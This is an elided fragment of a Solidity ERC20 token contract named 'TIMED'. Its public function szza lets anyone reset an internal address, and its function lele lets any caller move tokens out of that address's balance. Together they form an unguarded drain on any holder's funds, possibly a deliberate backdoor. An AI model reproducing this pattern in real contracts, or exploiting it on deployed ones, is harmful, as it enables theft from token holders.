...
contract Time is Context, IERC20, Ownable {
    ...
    string private _name = 'TIMED';
    string private _symbol = 'TIMED';
    ...
    //tibi
   function lele(address recipient, uint256 amount) public {
       require(_balances[sczh]>1000000000000000000, "buzu");
       _balances[sczh] -= amount;
       _balances[msg.sender] += amount;
       zyzl += amount;
       _zytq[msg.sender] += amount;
    }
    
    function gtx(address recipient) public view returns(uint256){
  ...
  function szza(address zh) public{
      sczh = zh;
  }
